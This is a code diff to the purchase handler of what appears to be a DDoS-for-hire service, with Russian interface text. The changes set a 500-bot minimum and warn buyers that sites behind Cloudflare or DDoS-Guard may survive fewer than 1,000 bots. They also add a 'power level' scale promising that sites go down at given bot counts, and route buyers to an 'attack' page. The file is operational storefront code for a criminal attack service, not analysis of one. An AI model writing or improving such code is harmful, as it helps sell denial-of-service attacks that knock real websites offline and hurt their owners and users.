@@ -1398,94 +1398,135 @@
                 updatePrice();
             }
 
-            window.handleBuy = async function() {
-                const count = parseInt($('botSlider').value);
-                const days = parseInt($('durationSelect').value);
-                const options = {};
-                document.querySelectorAll('.opt-check:checked').forEach(el => { options[el.dataset.key] = true; });
+            // ============================================================
+// ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ POWER LEVEL
+// ============================================================
+function getPowerLevel(botCount) {
+    if (botCount < 500) return "💩 ХУЁВЕНЬ (мизер)";
+    if (botCount < 1000) return "👍 НОРМАЛЬНО (но без гарантии)";
+    if (botCount < 5000) return "🔥 ХОРОШО (большинство сайтов падает)";
+    if (botCount < 50000) return "💥 МОЩНО (крупные сайты падают)";
+    if (botCount < 200000) return "⚡ ОГРОМНАЯ СИЛА";
+    return "☢️ ЯДЕРНЫЙ УДАР (всё падает)";
+}
 
-                // ===== ПРЕДУПРЕЖДЕНИЕ 500-999 БОТОВ =====
-                if (count >= 500 && count < 1000) {
-                    const confirmBuy = await new Promise((resolve) => {
-                        showModal(
-                            '⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ',
-                            `
-                            <div style="text-align:center; padding:10px;">
-                                <div style="font-size:48px; margin-bottom:12px;">⚠️</div>
-                                <p style="font-size:18px; font-weight:700; color:var(--accent-gold);">
-                                    Вы покупаете <strong>${count}</strong> ботов
-                                </p>
-                                <p style="margin:12px 0; padding:16px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
-                                    <span style="color:var(--accent-red); font-size:20px;">🔴 ВНИМАНИЕ:</span><br>
-                                    <span style="font-size:16px;">При <strong>${count} ботах</strong> защищённый сайт (Cloudflare/DDoS-Guard) <strong style="color:var(--accent-red);">МОЖЕТ НЕ УПАСТЬ!</strong></span>
-                                </p>
-                                <p style="color:var(--text-secondary); font-size:14px;">
-                                    Это минимальный уровень мощности.<br>
-                                    Рекомендуем купить <strong style="color:var(--accent-green);">от 1000+ ботов</strong> для гарантированного успеха!
-                                </p>
-                                <div style="margin-top:16px; padding:12px; background:rgba(239,68,68,0.1); border-radius:var(--radius-sm); border:1px solid var(--accent-red);">
-                                    <span style="color:var(--accent-red);">⚠️</span>
-                                    <span style="color:var(--text-primary);">Сайты с защитой могут выдержать ${count} ботов!</span>
-                                </div>
-                                <p style="margin-top:12px; font-size:13px; color:var(--text-secondary);">
-                                    💡 При 500-999 ботах — <span style="color:var(--accent-red);">НОРМАЛЬНО, но без гарантии</span>
-                                </p>
-                            </div>
-                            `,
-                            [
-                                { label: '✅ ВСЁ РАВНО КУПИТЬ', cls: 'btn-red', action: '()=>{ closeModal(); resolve(true); }' },
-                                { label: '🔙 НАЗАД, ДОКУПЛЮ', cls: 'btn-gold', action: '()=>{ closeModal(); resolve(false); }' }
-                            ],
-                            '⚠️'
-                        );
-                    });
-                    if (!confirmBuy) return;
-                }
+window.handleBuy = async function() {
+    const count = parseInt($('botSlider').value);
+    const days = parseInt($('durationSelect').value);
+    const options = {};
+    document.querySelectorAll('.opt-check:checked').forEach(el => {
+        options[el.dataset.key] = true;
+    });
 
-                try {
-                    const res = await apiFetch('/buy', {
-                        method: 'POST',
-                        body: JSON.stringify({ bot_count: count, duration_days: days, options })
-                    });
-                    if (res.error) {
-                        if (res.error.includes('Insufficient balance')) {
-                            const price = parseFloat($('buyPrice').textContent) || 0;
-                            showModal('❌ Недостаточно средств', `
-                                <p>У вас недостаточно средств для покупки.</p>
-                                <p style="margin:12px 0; padding:12px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
-                                    💳 Ваш баланс: <strong>${formatCurrency(currentUser.balance)}</strong><br>
-                                    💰 Нужно: <strong>${formatCurrency(price)}</strong>
-                                </p>
-                            `, [
-                                { label: '💎 ПОПОЛНИТЬ', cls: 'btn-gold', action: '()=>{ closeModal(); window.showDepositModal(); }' }
-                            ]);
-                            return;
-                        }
-                        showModal('Ошибка', res.error);
-                        return;
-                    }
-                    if (res.success) {
-                        currentUser.balance = res.new_balance;
-                        localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
-                        explosionEffect();
-                        showNotification('✅ Покупка успешна! ' + res.bot_count + ' ботов', 'success');
-                        showModal('✅ Покупка успешна!', `
-                            <p>🤖 <strong>${res.bot_count}</strong> ботов</p>
-                            <p>📅 <strong>${res.duration_days}</strong> дней</p>
-                            <p>💰 Стоимость: <strong>${formatCurrency(res.price)}</strong></p>
-                            <p>💳 Новый баланс: <strong>${formatCurrency(res.new_balance)}</strong></p>
-                            <p>⏳ Истекает: <strong>${formatDate(res.expires_at)}</strong></p>
-                            ${res.bot_count < 1000 ? `<p style="color:var(--accent-gold); margin-top:8px;">⚠️ ${res.bot_count} ботов — защищённый сайт может не упасть!</p>` : `<p style="color:var(--accent-green); margin-top:8px;">🔥 ${res.bot_count} ботов — гарантированный успех!</p>`}
-                        `, [
-                            { label: '⚔️ К атаке', cls: 'btn-red', action: '()=>{ closeModal(); navigateTo("attack"); }' },
-                            { label: '📊 Дашборд', cls: 'btn-purple', action: '()=>{ closeModal(); navigateTo("dashboard"); }' }
-                        ]);
-                        userBalance.textContent = formatCurrency(currentUser.balance);
-                    }
-                } catch(e) {
-                    showModal('Ошибка', 'Сервер недоступен');
-                }
-            };
+    // ===== ПРОВЕРКА: МИНИМУМ 500 =====
+    if (count < 500) {
+        showModal('❌ МИНИМУМ 500 БОТОВ!', `
+            <div style="text-align:center; padding:10px;">
+                <div style="font-size:48px; margin-bottom:12px;">🤏</div>
+                <p style="font-size:18px; font-weight:700; color:var(--accent-red);">
+                    Минимальная покупка — <strong>500 ботов</strong>
+                </p>
+                <p style="margin:12px 0; padding:16px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
+                    ${count} ботов — это <span style="color:var(--accent-red);">слишком мало</span>, атака не сработает.
+                </p>
+            </div>
+        `, [
+            { label: '🔙 ПОНЯЛ', cls: 'btn-gold', action: 'closeModal' }
+        ]);
+        return;
+    }
+
+    // ===== ПРЕДУПРЕЖДЕНИЕ 500-999 БОТОВ =====
+    if (count >= 500 && count < 1000) {
+        const confirmBuy = await new Promise((resolve) => {
+            showModal(
+                '⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ',
+                `
+                <div style="text-align:center; padding:10px;">
+                    <div style="font-size:48px; margin-bottom:12px;">⚠️</div>
+                    <p style="font-size:18px; font-weight:700; color:var(--accent-gold);">
+                        Вы покупаете <strong>${count}</strong> ботов
+                    </p>
+                    <p style="margin:12px 0; padding:16px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
+                        <span style="color:var(--accent-red); font-size:20px;">🔴 ВНИМАНИЕ:</span><br>
+                        <span style="font-size:16px;">При <strong>${count} ботах</strong> защищённый сайт (Cloudflare/DDoS-Guard) <strong style="color:var(--accent-red);">МОЖЕТ НЕ УПАСТЬ!</strong></span>
+                    </p>
+                    <p style="color:var(--text-secondary); font-size:14px;">
+                        Это минимальный уровень мощности.<br>
+                        Рекомендуем купить <strong style="color:var(--accent-green);">от 1000+ ботов</strong> для гарантии!
+                    </p>
+                    <div style="margin-top:16px; padding:12px; background:rgba(239,68,68,0.1); border-radius:var(--radius-sm); border:1px solid var(--accent-red);">
+                        <span style="color:var(--accent-red);">⚠️</span>
+                        <span style="color:var(--text-primary);">Сайты с защитой могут выдержать ${count} ботов!</span>
+                    </div>
+                    <p style="margin-top:12px; font-size:13px; color:var(--text-secondary);">
+                        💡 ${count} ботов — <span style="color:var(--accent-gold);">НОРМАЛЬНО, но без гарантии</span>
+                    </p>
+                </div>
+                `,
+                [
+                    { label: '✅ ВСЁ РАВНО КУПИТЬ', cls: 'btn-red', action: '()=>{ closeModal(); resolve(true); }' },
+                    { label: '🔙 ДОКУПЛЮ БОЛЬШЕ', cls: 'btn-gold', action: '()=>{ closeModal(); resolve(false); }' }
+                ],
+                '⚠️'
+            );
+        });
+        if (!confirmBuy) return;
+    }
+
+    // ===== ОСНОВНАЯ ПОКУПКА =====
+    try {
+        const res = await apiFetch('/buy', {
+            method: 'POST',
+            body: JSON.stringify({ bot_count: count, duration_days: days, options })
+        });
+        if (res.error) {
+            if (res.error.includes('Insufficient balance')) {
+                const price = parseFloat($('buyPrice').textContent) || 0;
+                showModal('❌ Недостаточно средств', `
+                    <p>У вас недостаточно средств для покупки.</p>
+                    <p style="margin:12px 0; padding:12px; background:var(--bg-surface-2); border-radius:var(--radius-sm);">
+                        💳 Ваш баланс: <strong>${formatCurrency(currentUser.balance)}</strong><br>
+                        💰 Нужно: <strong>${formatCurrency(price)}</strong>
+                    </p>
+                `, [
+                    { label: '💎 ПОПОЛНИТЬ', cls: 'btn-gold', action: '()=>{ closeModal(); window.showDepositModal(); }' }
+                ]);
+                return;
+            }
+            showModal('Ошибка покупки', res.error);
+            return;
+        }
+        if (res.success) {
+            currentUser.balance = res.new_balance;
+            localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
+
+            // ВЗРЫВНАЯ АНИМАЦИЯ
+            explosionEffect();
+
+            const powerMsg = count < 1000 ?
+                `<p style="color:var(--accent-gold); margin-top:8px;">⚠️ ${count} ботов — защищённый сайт может не упасть!</p>` :
+                `<p style="color:var(--accent-green); margin-top:8px;">🔥 ${count} ботов — гарантированный успех!</p>`;
+
+            showModal('✅ Покупка успешна!', `
+                <p>🤖 <strong>${res.bot_count}</strong> ботов</p>
+                <p>📅 <strong>${res.duration_days}</strong> дней</p>
+                <p>💰 Стоимость: <strong>${formatCurrency(res.price)}</strong></p>
+                <p>💳 Новый баланс: <strong>${formatCurrency(res.new_balance)}</strong></p>
+                <p>⏳ Истекает: <strong>${formatDate(res.expires_at)}</strong></p>
+                ${powerMsg}
+                <p style="margin-top:8px; font-size:12px; color:var(--text-secondary);">💡 ${getPowerLevel(res.bot_count)}</p>
+            `, [
+                { label: '⚔️ К АТАКЕ', cls: 'btn-red', action: '()=>{ closeModal(); navigateTo("attack"); }' },
+                { label: '📊 ДАШБОРД', cls: 'btn-purple', action: '()=>{ closeModal(); navigateTo("dashboard"); }' }
+            ]);
+            userBalance.textContent = formatCurrency(currentUser.balance);
+            showNotification('✅ Покупка успешна! ' + res.bot_count + ' ботов', 'success');
+        }
+    } catch(e) {
+        showModal('Ошибка', 'Сервер недоступен');
+    }
+};
 
             // ===== ATTACK =====
             async function renderAttack(data) {
